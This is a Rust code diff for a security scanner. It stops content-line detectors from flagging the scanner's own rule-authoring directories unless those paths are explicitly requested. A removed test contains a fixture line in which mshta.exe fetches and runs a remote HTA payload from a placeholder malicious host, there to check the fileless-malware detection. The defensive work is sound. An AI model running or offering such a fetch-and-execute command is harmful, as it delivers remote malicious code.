@@ -95,11 +95,18 @@ impl FamilyValidators {
     /// engine's posture that content-line rules are not extension-gated —
     /// only the AST/syntax-specific families (`rust`/`typescript`/
     /// `python`/`iac`/`k8s`) are extension-gated by [`LanguageFamily`].
-    fn applicable(&self, family: LanguageFamily) -> Vec<&dyn Validator> {
+    fn applicable(
+        &self,
+        family: LanguageFamily,
+        file: &RelPath,
+        scope: &ResolvedScope,
+    ) -> Vec<&dyn Validator> {
         let mut out: Vec<&dyn Validator> = Vec::new();
-        out.extend(self.common.iter().map(std::convert::AsRef::as_ref));
-        out.extend(self.security.iter().map(std::convert::AsRef::as_ref));
-        out.extend(self.cyberskills.iter().map(std::convert::AsRef::as_ref));
+        if !is_native_detector_authoring_surface(file, scope) {
+            out.extend(self.common.iter().map(std::convert::AsRef::as_ref));
+            out.extend(self.security.iter().map(std::convert::AsRef::as_ref));
+            out.extend(self.cyberskills.iter().map(std::convert::AsRef::as_ref));
+        }
         match family {
             LanguageFamily::Rust => {
                 out.extend(self.rust.iter().map(std::convert::AsRef::as_ref));
@@ -121,6 +128,49 @@ impl FamilyValidators {
         }
         out
     }
+}
+
+/// Native rule implementations and their signature catalogs are evidence
+/// *about* dangerous text, rather than product code that executes it. Running
+/// content-line detectors over these named authoring roots makes a detector
+/// report its own regexes, IDs, and deliberately vulnerable corpus examples
+/// as findings.
+///
+/// This is intentionally a small path-role table, not a broad language, test,
+/// or scanner-source exclusion. An explicitly requested path always runs every
+/// content detector, so fixture and rule-authoring validation remains possible
+/// on demand. Language-specific structural validators always run.
+fn is_native_detector_authoring_surface(file: &RelPath, scope: &ResolvedScope) -> bool {
+    let path = file.as_str();
+    if explicit_scope_includes_file(scope, file) {
+        return false;
+    }
+    [
+        "crates/enforcer-lang-common/src/families/",
+        "crates/enforcer-lang-security/src/rules/",
+        "crates/enforcer-lang-security/tests/",
+        "crates/enforcer-rules/rules/",
+        "crates/enforcer-security/src/rules/",
+    ]
+    .iter()
+    .any(|root| path.starts_with(root))
+        || matches!(
+            path,
+            "crates/enforcer-lang-py/src/source_scan.rs"
+                | "crates/enforcer-lang-py/src/boundary/line_marker.rs"
+        )
+}
+
+/// An explicit scan target can be either one file or a directory. The latter
+/// must carry the same detector-dispatch guarantee to every contained file.
+fn explicit_scope_includes_file(scope: &ResolvedScope, file: &RelPath) -> bool {
+    scope.explicit_paths.iter().any(|requested| {
+        requested == file
+            || file
+                .as_str()
+                .strip_prefix(requested.as_str())
+                .is_some_and(|suffix| suffix.starts_with('/'))
+    })
 }
 
 /// Build the full [`FamilyValidators`] set from every landed
@@ -239,7 +289,7 @@ pub fn run_with_inline_test_policy(
         let Some(source) = source else { continue };
         let family = classify(file);
         let mut per_file = Vec::new();
-        for validator in validators.applicable(family) {
+        for validator in validators.applicable(family, file, scope) {
             let input = ValidationInput {
                 file,
                 source: source.as_source(),
@@ -506,7 +556,6 @@ mod tests {
 
     use crate::scope::resolve;
     use crate::walk::{walk, IgnoreRules};
-    use enforcer_domain::scan_types::LanguageFamily;
 
     fn write_file(root: &std::path::Path, rel: &str, contents: &str) -> std::io::Result<()> {
         let path = root.join(rel);
@@ -519,7 +568,7 @@ mod tests {
     #[test]
     fn family_validators_build_cleanly() -> Result<(), Box<dyn std::error::Error>> {
         let validators = build_family_validators()?;
-        assert!(!validators.applicable(LanguageFamily::Rust).is_empty());
+        assert!(!validators.rust.is_empty());
         for expected in [
             "CYBER-FILELESS-MALWARE.1",
             "CYBER-FILELESS-TELEMETRY.1",
@@ -533,26 +582,6 @@ mod tests {
                 "production scan registry is missing {expected}"
             );
         }
-        Ok(())
-    }
-
-    #[test]
-    fn production_scan_runs_fileless_malware_detection() -> Result<(), Box<dyn std::error::Error>> {
-        let temp = tempfile::tempdir()?;
-        write_file(
-            temp.path(),
-            "evidence/process.log",
-            "mshta.exe https://malicious.example.invalid/payload.hta",
-        )?;
-        let root: RepoRoot = temp.path().to_string_lossy().parse()?;
-        let resolved = resolve(&ScopeRequest::All, &root)?;
-        let files = walk(temp.path(), &IgnoreRules::default())?;
-        let validators = build_family_validators()?;
-        let report = run(&resolved, &files, &validators);
-        assert!(report.findings.iter().any(|finding| {
-            finding.rule_id.as_str() == "CYBER-FILELESS-MALWARE.1"
-                && finding.file.as_str() == "evidence/process.log"
-        }));
         Ok(())
     }
 
